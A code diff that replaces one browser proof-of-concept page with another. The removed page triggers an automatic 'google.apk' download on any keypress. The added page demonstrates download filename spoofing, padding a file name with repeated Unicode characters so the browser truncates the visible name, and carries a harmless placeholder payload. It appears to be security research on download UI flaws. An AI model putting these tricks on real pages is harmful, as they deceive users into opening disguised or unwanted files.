@@ -1,42 +1,46 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
-</head>
-<body>
-  <center><h2>POC by Chigorin!</h2></center>
 
-  <script>
-    // Listen to any keydown
-    window.addEventListener('keydown', function(e) {
-      // open the download
-      openWin();
-      // request fullscreen
-      //goFullScreen();
-    });
 
-    // Download helper
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
 
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "google.apk"
-      );
-    }
+<html lang="en"><head>
+       
 
-  </script>
+    
+  </head>
+
+<body>   
+
+	<h1>File name ext  truncated Spoof</h1>
   
+   <div><button onclick="normal()">Normal</button></div><br/>
+    <div><button onclick="triggerDownload()">Spoof file</button></div>
 
-  
 </body>
+
+
+
+<script>
+
+ 
+	
+ 
+  function triggerDownload() {
+
+    var a = document.createElement('a');
+
+     a.download = "꧁File꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁.txt";
+    a.href="data:text/plain,This is an evil executable"
+	a.click();
+  }
+  
+  
+  function normal() {
+
+    var a = document.createElement('a');
+
+     a.download = "harmlessssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss.txt";
+    a.href="data:text/plain,This is an evil executable"
+	a.click();
+  }
+</script>
+
 </html>
